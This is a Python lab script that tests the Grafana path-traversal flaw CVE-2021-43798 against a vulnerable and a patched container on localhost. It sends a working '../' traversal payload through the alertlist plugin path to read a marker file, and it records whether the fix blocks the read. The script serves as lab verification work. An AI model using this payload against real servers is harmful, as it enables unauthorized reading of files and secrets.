# ЛР2: проверка CVE-2021-43798 на локальных контейнерах 18083 и 18084
import http.client,json,time
from pathlib import Path
from datetime import datetime,timezone
ROOT=Path(__file__).resolve().parent
ATTACK='/public/plugins/alertlist/'+'../'*12+'tmp/lab2-proof.txt'
def request(port,path):
    c=http.client.HTTPConnection('127.0.0.1',port,timeout=10)
    c.request('GET',path)
    r=c.getresponse(); data=r.read().decode('utf-8','replace'); c.close()
    return dict(path=path,status=r.status,body=data[:5000])
def main():
    env=[]
    for name,port,version in [('vulnerable',18083,'8.3.0'),('fixed',18084,'8.3.1')]:
        for i in range(40):
            try:
                health=request(port,'/api/health')
                if health['status']==200: break
            except OSError: pass
            time.sleep(1)
        env.append(dict(name=name,port=port,version=version,health=health,login=request(port,'/login'),traversal=request(port,ATTACK),missing=request(port,'/public/plugins/alertlist/'+'../'*12+'tmp/lab2-nonexistent.txt')))
    a,b=env; marker='LAB2-CVE-2021-43798-CONTROLLED-FILE'
    checks={'versions_match': all(json.loads(x['health']['body'])['version']==x['version'] for x in env),'vulnerable_file_read':a['traversal']['status']==200 and marker in a['traversal']['body'],'fixed_file_read_blocked':b['traversal']['status'] in (400,403,404) and marker not in b['traversal']['body'],'missing_file_not_leaked':all(marker not in x['missing']['body'] and x['missing']['status']!=200 for x in env),'login_works_both':all(x['login']['status']==200 and 'Grafana' in x['login']['body'] for x in env),'health_works_both':all(x['health']['status']==200 and json.loads(x['health']['body'])['database']=='ok' for x in env)}
    data=dict(cve='CVE-2021-43798',checked_at=datetime.now(timezone.utc).isoformat(),scope='127.0.0.1:18083/18084',environments=env,checks=checks,all_passed=all(checks.values()))
    (ROOT/'results.json').write_text(json.dumps(data,ensure_ascii=False,indent=2))
    print(json.dumps(dict(checked_at=data['checked_at'],checks=checks,all_passed=data['all_passed']),indent=2))
    for x in env: print(x['name'],x['version'],'HTTP',x['traversal']['status'],x['traversal']['body'][:120])
    if not data['all_passed']: raise SystemExit(1)
if __name__=='__main__': main()
